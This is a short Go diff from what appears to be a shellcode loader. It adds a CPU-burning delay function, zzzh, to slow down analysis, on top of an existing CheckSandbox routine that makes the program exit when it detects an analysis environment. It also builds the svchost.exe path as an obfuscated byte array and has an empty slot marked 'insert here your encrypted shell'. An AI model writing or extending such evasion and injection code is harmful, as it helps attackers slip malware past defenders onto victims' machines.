@@ -129,6 +129,19 @@ func CheckSandbox() bool {
     return cpuSandbox || memorySandbox || diskSandbox || internetSandbox || processSandbox
 }
 
+func zzzh() {
+	const S = 500000
+
+	for i := 0; i <= S; i++ {
+		for j := 2; j <= i/2; j++ {
+			if i%j == 0 {
+				break
+			}
+		}
+	}
+}
+
+
 func main() {
     if CheckSandbox() {
         return 
@@ -136,6 +149,7 @@ func main() {
 	epath := []byte{
 		'C', ':', '\\', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 's', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 's', 'v', 'c', 'h', 'o', 's', 't', '.', 'e', 'x', 'e',
 	}
+	zzzh()
 	path := string(epath)  
 	//insert here your encrypted shell
 	sch := []byte("")
